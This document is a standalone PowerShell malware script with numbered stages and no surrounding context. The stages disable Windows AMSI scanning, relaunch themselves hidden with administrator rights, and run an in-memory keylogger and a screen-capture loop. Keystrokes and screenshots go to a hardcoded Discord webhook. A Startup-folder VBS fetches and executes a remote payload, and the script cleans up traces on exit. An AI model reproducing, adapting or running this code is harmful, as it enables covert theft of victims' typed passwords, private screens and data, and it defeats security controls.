# Stage 0: AMSI/Security Bypass (Polymorphic)  
$v1 = 'Ams'+'iUti'+'ls'; $v2 = 'ams'+'iIn'+'itFai'+'led'  
[Ref].Assembly.GetType("System.Management.Automation.$v1").GetField($v2,'NonPublic,Static').SetValue($null,$true)  

# Stage 1: Silent Elevation  
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {  
    $scriptBytes = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$PSCommandPath"))  
    Start-Process powershell.exe "-EncodedCommand $scriptBytes" -Verb RunAs -WindowStyle Hidden  
    Exit  
}  

# Stage 2: Environment Setup  
$webhook = "https://discord.com/api/webhooks/1462582585132847211/M7Twj4Dn31u0l4orBDpO5MnPsgUTsSJYSuuGqT8HQImL1a6ht5OPwkN4tqjX3YEG6Vy5"  
$tempDir = $env:TEMP  
$logPath = "$tempDir\sysdiag.log"  

# Stage 3: Memory-Resident Keylogger (No File Write)  
$keylogCode = @'  
using System;  
using System.Diagnostics;  
using System.Runtime.InteropServices;  
using System.Windows.Forms;  

public class Win32Hook {  
    [DllImport("user32.dll")]  
    public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);  

    [DllImport("user32.dll")]  
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);  

    [DllImport("user32.dll")]  
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);  

    [DllImport("kernel32.dll")]  
    public static extern IntPtr GetModuleHandle(string lpModuleName);  

    public delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);  
    public static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {  
        if (code >= 0 && wParam == (IntPtr)0x100) {  
            string key = ((Keys)Marshal.ReadInt32(lParam)).ToString();  
            AppDomain.CurrentDomain.SetData("KEYLOG_DATA", (AppDomain.CurrentDomain.GetData("KEYLOG_DATA") ?? "") + key);  
        }  
        return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);  
    }  

    public static void Main() {  
        IntPtr hook = SetWindowsHookEx(13, HookCallback, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);  
        Application.Run();  
        UnhookWindowsHookEx(hook);  
    }  
}  
'@  

Add-Type -TypeDefinition $keylogCode -ReferencedAssemblies System.Windows.Forms  
Start-Job -ScriptBlock {  
    [Win32Hook]::Main() | Out-Null  
    while($true) {  
        $keys = [AppDomain]::CurrentDomain.GetData("KEYLOG_DATA")  
        if ($keys) {  
            Invoke-RestMethod -Uri $using:webhook -Method Post -Body @{content="[KEYS] $keys"}  
            [AppDomain]::CurrentDomain.SetData("KEYLOG_DATA", "")  
        }  
        Start-Sleep -Seconds 30  
    }  
} | Out-Null  

# Stage 4: Stealthy Persistence  
$wscriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\syscheck.vbs"  
@"  
Set objShell = CreateObject("WScript.Shell")  
objShell.Run "powershell -Exec Bypass -Window Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('http://YOUR_RAW_PS1_URL/payload.ps1')`"", 0  
"@ | Out-File $wscriptPath -Encoding ASCII  

# Stage 5: Lightweight Screen Capture (JPEG2000 + Chunking)  
Start-Job -ScriptBlock {  
    Add-Type -AssemblyName System.Windows.Forms  
    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatID -eq [System.Guid]'a4a5a6a7-a8a9-aaab-acad-aeafb0b1b2b3' }  
    $params = New-Object System.Drawing.Imaging.EncoderParameters(1)  
    $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 30L)  

    while($true) {  
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds  
        $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)  
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)  
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)  
        
        $ms = New-Object System.IO.MemoryStream  
        $bmp.Save($ms, $encoder, $params)  
        $chunks = [Convert]::ToBase64String($ms.ToArray()) -split '(?<=\G.{1500})'  
        
        foreach ($chunk in $chunks) {  
            $payload = @{  
                content = "SCREEN_CHUNK:$([Guid]::NewGuid())"  
                embeds = @(@{  
                    description = "`u{200B}"  
                    fields = @(@{  
                        name = "data"  
                        value = $chunk  
                    })  
                })  
            }  
            Invoke-RestMethod -Uri $using:webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"  
        }  
        Start-Sleep -Seconds 120  
    }  
} | Out-Null  

# Stage 6: Auto-Clean Traces  
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {  
    Remove-Item $wscriptPath -Force -ErrorAction SilentlyContinue  
    Stop-Process -Id $PID -Force  
}  

# Keep Alive  
while($true) { Start-Sleep -Seconds 3600 }  